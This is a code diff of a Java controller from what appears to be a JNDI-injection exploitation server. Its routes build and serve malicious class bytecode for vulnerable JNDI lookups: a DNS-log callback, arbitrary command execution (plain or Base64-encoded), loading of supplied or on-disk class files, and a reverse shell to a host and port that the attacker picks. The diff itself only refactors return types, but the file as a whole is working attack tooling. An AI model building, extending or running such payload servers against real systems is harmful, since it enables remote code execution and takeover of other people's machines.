@@ -2,7 +2,6 @@ package map.jndi.controller;
 
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
-import map.jndi.bean.ClassBean;
 import map.jndi.server.WebServer;
 import map.jndi.template.ReverseShellTemplate;
 import map.jndi.util.MiscUtil;
@@ -20,13 +19,22 @@ import java.util.Base64;
 @JNDIController
 @JNDIMapping("/Basic")
 public class BasicController implements Controller {
-    public Object process(ClassBean classBean) {
-        WebServer.serveFile("/" + classBean.getName() + ".class", classBean.getData());
-        return classBean.getName();
+    public Object process(byte[] byteCode) {
+        String className;
+
+        try {
+            ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
+            className = classFile.getName();
+        } catch (Exception e) {
+            return null;
+        }
+
+        WebServer.serveFile("/" + className + ".class", byteCode);
+        return className;
     }
 
     @JNDIMapping("/DnsLog/{url}")
-    public ClassBean dnsLog(String url) throws Exception {
+    public byte[] dnsLog(String url) throws Exception {
         String className = MiscUtil.getRandStr(12);
 
         if (!url.startsWith("http://")) {
@@ -46,11 +54,11 @@ public class BasicController implements Controller {
         clazz.addConstructor(constructor);
 
         System.out.println("DnsLog: " + url);
-        return new ClassBean(className, clazz.toBytecode());
+        return clazz.toBytecode();
     }
 
     @JNDIMapping("/Command/{cmd}")
-    public ClassBean command(String cmd) throws Exception {
+    public byte[] command(String cmd) throws Exception {
         String className = MiscUtil.getRandStr(12);
 
         ClassPool pool = ClassPool.getDefault();
@@ -66,50 +74,30 @@ public class BasicController implements Controller {
         clazz.addConstructor(constructor);
 
         System.out.println("Cmd: " + cmd);
-        return new ClassBean(className, clazz.toBytecode());
+        return clazz.toBytecode();
     }
 
     @JNDIMapping("/Command/Base64/{cmd}")
-    public ClassBean base64Command(String cmd) throws Exception {
+    public byte[] base64Command(String cmd) throws Exception {
         cmd = new String(Base64.getUrlDecoder().decode(cmd));
         return this.command(cmd);
     }
 
     @JNDIMapping("/FromCode/{code}")
-    public ClassBean fromCode(String code) throws Exception {
-        String className = MiscUtil.getRandStr(12);
+    public byte[] fromCode(String code) {
         byte[] byteCode = Base64.getUrlDecoder().decode(code);
-
-        ClassPool pool = ClassPool.getDefault();
-        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(byteCode)));
-        classFile.setMajorVersion(ClassFile.JAVA_8);
-        classFile.setAccessFlags(AccessFlag.PUBLIC);
-        CtClass clazz = pool.makeClass(classFile);
-        clazz.replaceClassName(clazz.getName(), className);
-
-        System.out.println("FromCode ClassName: " + clazz.getName() + " Length: " + byteCode.length);
-        return new ClassBean(className, clazz.toBytecode());
+        return byteCode;
     }
 
     @JNDIMapping("/FromPath/{path}")
-    public ClassBean fromPath(String path) throws Exception {
+    public byte[] fromPath(String path) throws Exception {
         String className = MiscUtil.getRandStr(12);
-        path = new String(Base64.getUrlDecoder().decode(path));
-        byte[] data = Files.readAllBytes(Paths.get(path));
-
-        ClassPool pool = ClassPool.getDefault();
-        ClassFile classFile = new ClassFile(new DataInputStream(new ByteArrayInputStream(data)));
-        classFile.setMajorVersion(ClassFile.JAVA_8);
-        classFile.setAccessFlags(AccessFlag.PUBLIC);
-        CtClass clazz = pool.makeClass(classFile);
-        clazz.replaceClassName(clazz.getName(), className);
-
-        System.out.println("FromPath ClassName: " + clazz.getName() + " Path: " + path + " Length: " + data.length);
-        return new ClassBean(className, clazz.toBytecode());
+        byte[] byteCode = Files.readAllBytes(Paths.get(path));
+        return byteCode;
     }
 
     @JNDIMapping("/ReverseShell/{host}/{port}")
-    public ClassBean reverseShell(String host, String port) throws Exception {
+    public byte[] reverseShell(String host, String port) throws Exception {
         String className = MiscUtil.getRandStr(12);
 
         ClassPool pool = ClassPool.getDefault();
@@ -120,6 +108,6 @@ public class BasicController implements Controller {
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
 
         System.out.println("ReverseShell ClassName: " + clazz.getName() + " Host: " + host + " Port: " + port);
-        return new ClassBean(className, clazz.toBytecode());
+        return clazz.toBytecode();
     }
 }
